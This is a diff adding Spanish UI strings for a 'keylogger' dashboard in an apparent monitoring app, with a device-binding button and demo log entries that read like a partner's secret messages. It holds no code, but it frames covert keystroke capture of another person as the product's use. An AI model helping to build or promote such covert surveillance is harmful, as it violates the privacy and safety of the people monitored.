@@ -825,5 +825,37 @@
       "title": "Mapa de ubicación",
       "selected_location": "Ubicación seleccionada"
     }
+  },
+  "dkl": {
+    "header": {
+      "title": "Registrador de Teclas",
+      "demo_message": "Datos de demostración. Vincula tu dispositivo para recopilar datos reales.",
+      "bind_button": "Vincular mi dispositivo",
+      "bind_button_aria": "Vincular dispositivo para comenzar a recopilar datos"
+    },
+    "dropdown": {
+      "label": "Aplicaciones"
+    },
+    "table": {
+      "app_name": "Nombre de la aplicación",
+      "logged_text": "Texto registrado",
+      "time": "Hora",
+      "no_activity": "Sin actividad reciente"
+    },
+    "pagination": {
+      "prev_button_aria": "Página anterior",
+      "next_button_aria": "Página siguiente"
+    },
+    "logs": [
+      { "text": "¿Cómo ocultar mensajes en el teléfono?" },
+      { "text": "Encuéntrame esta noche, no se lo digas a nadie." },
+      { "text": "Les dije que estoy trabajando hasta tarde." },
+      { "text": "¿Cómo eliminar el historial de chats?" },
+      { "text": "¿Puedes cubrirme mañana?" },
+      { "text": "Nos encontramos en el lugar de siempre." },
+      { "text": "No puedo dejar que se enteren." },
+      { "text": "Borra esto después de leerlo." },
+      { "text": "¿Cómo borrar el historial del navegador?" }
+    ]
   }
 }
